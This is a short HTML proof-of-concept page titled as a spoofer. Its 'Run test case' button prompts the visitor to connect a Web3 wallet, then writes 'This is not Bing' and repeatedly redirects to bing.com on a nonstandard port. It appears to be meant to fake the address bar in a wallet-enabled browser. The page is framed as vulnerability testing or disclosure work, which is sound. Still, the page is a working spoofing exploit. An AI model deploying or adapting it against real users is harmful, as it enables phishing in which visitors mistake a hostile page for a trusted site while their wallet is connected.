<!DOCTYPE html>
<html>
<head>
  <title>Spoofer Proof of Concept</title>
</head>
<body>
<script>
  async function spoof() {
    // Check if Web3 is available
    if (typeof window.ethereum !== 'undefined') {
      try {
        // Prompt the user to connect their wallet
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        
        // Wallet connection successful, redirect to the spoofed URL
        document.write("<h1>This is not Bing</h1>");
        document.location = "https://bing.com:1234";
        setInterval(function(){document.location="https://bing.com:1234";}, 9800);
      } catch (error) {
        // User rejected the connection request or some error occurred
        console.error('Wallet connection failed:', error);
      }
    } else {
      // Web3 not available, display a message or redirect to a different page
      alert('Web3 not available. Please use a Web3-enabled browser and try again.');
    }
  };
</script>

<p class="test">
  <input class="btn btn-success btn-lg" type="button" value="Run test case" onclick="spoof();" />
</p>

<!-- Include the Web3 library here if needed -->
<!-- For example, using the Web3.js CDN -->
<!-- <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script> -->

</body>
</html>
